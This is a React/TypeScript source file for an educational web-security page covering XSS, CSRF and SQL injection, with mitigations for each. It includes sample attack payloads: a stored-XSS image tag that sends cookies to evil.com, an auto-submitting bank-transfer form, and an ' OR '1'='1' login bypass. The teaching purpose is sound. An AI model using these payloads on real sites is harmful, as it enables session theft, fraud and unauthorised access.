import type { Topic } from "@/data/types";
import { Card } from "@/components/ui/Card";
import { Grid } from "@/components/ui/Grid";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { Callout } from "@/components/ui/Callout";

export const webSecurityTopic: Topic = {
  id: "web-security",
  title: "Web Security (XSS, CSRF, SQLi)",
  description:
    "The most exploited vulnerability classes on the modern web and their battle-tested mitigation strategies.",
  tags: ["security", "owasp", "frontend", "backend"],
  icon: "Bug",
  content: [
    <p key="1">
      The OWASP Top 10 defines the most critical web security risks.
      Understanding how attackers exploit these vulnerabilities is the first
      step to defending against them.
    </p>,
    <h4 key="2" className="text-xl font-bold mt-8 mb-4">
      The Big Three Attack Vectors
    </h4>,
    <Grid key="3" cols={1} gap={6} className="mb-8">
      <Card
        title="Cross-Site Scripting (XSS)"
        description="Injecting malicious JavaScript into a trusted website."
      >
        <p className="text-sm mt-2">
          An attacker injects a <code>&lt;script&gt;</code> tag into a page
          (e.g., via a comment field). When another user views it, the script
          runs in their browser session, stealing cookies, tokens, or
          keystrokes.
        </p>
        <CodeBlock
          language="html"
          code={`<!-- Stored XSS in a forum comment -->
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`}
        />
        <p className="text-xs text-emerald-400 mt-3 font-bold">
          ✅ Mitigation: Sanitize all user input. Use Content-Security-Policy
          headers. React/Vue auto-escape JSX by default.
        </p>
      </Card>
      <Card
        title="Cross-Site Request Forgery (CSRF)"
        description="Tricking an authenticated user's browser into performing unwanted actions."
      >
        <p className="text-sm mt-2">
          If a user is logged into their bank, a malicious site can embed a
          hidden form that auto-submits a money transfer using the user's
          existing session cookies.
        </p>
        <CodeBlock
          language="html"
          code={`<!-- Hidden on evil-site.com -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit()</script>`}
        />
        <p className="text-xs text-emerald-400 mt-3 font-bold">
          ✅ Mitigation: CSRF Tokens (a unique token per form). SameSite=Strict
          cookie attribute. Verify Origin/Referer headers.
        </p>
      </Card>
      <Card
        title="SQL Injection (SQLi)"
        description="Manipulating backend SQL queries by injecting raw SQL through user inputs."
      >
        <p className="text-sm mt-2">
          If a login form directly concatenates user input into a SQL query, an
          attacker can bypass authentication entirely.
        </p>
        <CodeBlock
          language="sql"
          code={`-- Vulnerable query
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'

-- The OR '1'='1' always evaluates true, dumping all user records.`}
        />
        <p className="text-xs text-emerald-400 mt-3 font-bold">
          ✅ Mitigation: NEVER concatenate strings into SQL. Always use
          Parameterized Queries / Prepared Statements with bound variables.
        </p>
      </Card>
    </Grid>,
    <Callout key="4" type="info" title="Defense in Depth">
      Never rely on a single layer. Apply input validation (frontend), output
      encoding (backend), parameterized queries (DB), Content-Security-Policy
      (HTTP headers), and rate limiting (infrastructure) simultaneously.
    </Callout>,
  ],
};
